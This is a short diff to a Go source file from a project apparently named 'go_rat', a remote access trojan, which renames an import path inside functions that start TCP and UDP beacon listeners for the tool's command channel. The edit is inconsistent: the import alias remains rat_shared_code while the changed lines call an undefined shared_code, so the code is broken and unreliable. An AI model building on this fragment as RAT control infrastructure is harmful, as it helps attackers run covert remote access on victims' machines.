@@ -11,7 +11,7 @@
 package command_binary
 
 import (
-	rat_shared_code "go_rat/pkg/Rat_shared_code"
+	rat_shared_code "go_rat/pkg/shared_code"
 
 	"net"
 )
@@ -25,7 +25,7 @@ func start_tcp() net.TCPListener {
 	TCPserver, derp := net.ListenTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN)
 
 	if derp != nil {
-		rat_shared_code.Error_printer(derp, "[-] TCP Beacon Listener failed to start")
+		shared_code.Error_printer(derp, "[-] TCP Beacon Listener failed to start")
 	}
 	return *TCPserver
 
@@ -33,7 +33,7 @@ func start_tcp() net.TCPListener {
 func start_udp() net.UDPConn {
 	UDPserver, derp := net.ListenUDP("udp", &rat_shared_code.Local_udpaddr_LAN)
 	if derp != nil {
-		rat_shared_code.Error_printer(derp, "[-] UDP Beacon Listener failed to start")
+		shared_code.Error_printer(derp, "[-] UDP Beacon Listener failed to start")
 	}
 	return *UDPserver
 }
